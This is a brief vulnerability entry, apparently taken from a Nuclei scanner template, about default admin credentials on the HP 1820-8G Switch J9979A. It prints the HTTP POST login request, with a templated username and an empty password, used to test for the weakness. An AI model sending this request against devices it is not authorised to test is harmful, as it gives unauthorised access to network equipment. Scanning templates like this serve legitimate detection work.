# Vulnerability: HP 1820-8G Switch J9979A Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`hp-switch-default-login.yaml`)

## Description
HP 1820-8G Switch J9979A default admin login credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /htdocs/login/login.lua HTTP/1.1
Host: {{Hostname}}

username={{username}}&password=
```

